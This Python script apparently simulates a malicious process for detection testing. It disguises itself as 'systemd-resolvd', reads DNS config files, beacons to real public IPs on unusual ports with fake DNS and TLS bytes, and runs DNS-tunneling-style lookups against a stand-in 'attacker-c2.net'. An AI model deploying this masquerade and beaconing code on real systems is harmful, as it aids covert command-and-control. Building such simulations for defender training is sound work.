from __future__ import annotations

import pathlib
import socket
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

# Typo: systemd-resolvd (missing 'e') vs legitimate systemd-resolved
PROC = "systemd-resolvd"

# Beaconing targets — legit-looking but on wrong ports or suspicious combos
BEACON_TARGETS = [
    ("8.8.8.8",   53),    # Google DNS — normal
    ("8.8.8.8",   443),   # Google DNS on HTTPS — suspicious
    ("1.1.1.1",   853),   # Cloudflare DoT — could be legit
    ("208.67.222.222", 5353),  # OpenDNS on mDNS port — odd
    ("91.108.4.1", 443),  # Telegram IP — suspicious for "resolver"
]


def read_dns_config() -> None:
    for path in ["/etc/resolv.conf", "/etc/nsswitch.conf", "/etc/hosts"]:
        try:
            content = pathlib.Path(path).read_text()
            log(PROC, f"Read {path}: {len(content)} bytes")
        except Exception:
            pass


def beacon() -> None:
    host, port = random.choice(BEACON_TARGETS)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        if port == 53:
            # Fake DNS query
            dns_query = bytes.fromhex(
                "aabb01000001000000000000"
                "06676f6f676c6503636f6d0000010001"
            )
            s.sendall(dns_query)
        elif port == 443:
            # TLS ClientHello-ish bytes
            s.sendall(b"\x16\x03\x01\x00\xf1\x01\x00\x00\xed\x03\x03" + b"\x00" * 32)

        try:
            resp = s.recv(256)
            log(PROC, f"Beacon {host}:{port} OK — {len(resp)} bytes")
        except socket.timeout:
            log(PROC, f"Beacon {host}:{port} sent, no response")
        s.close()
    except Exception as e:
        log(PROC, f"Beacon {host}:{port} failed — {e}")


def dns_tunnel_sim() -> None:
    # Simulate DNS tunneling: long random subdomains
    labels = ["".join(random.choices("abcdef0123456789", k=16)) for _ in range(3)]
    fake_domain = ".".join(labels) + ".attacker-c2.net"
    try:
        socket.getaddrinfo(fake_domain, None)
    except Exception:
        pass
    log(PROC, f"DNS lookup: {fake_domain}")


def main() -> None:
    set_proc_name(PROC)
    read_dns_config()
    log(PROC, "systemd-resolvd starting — DNS resolution daemon")

    while True:
        beacon()
        if random.random() < 0.2:
            dns_tunnel_sim()
        time.sleep(jitter(75.0))  # ~75s beacon interval, 30% jitter


main()
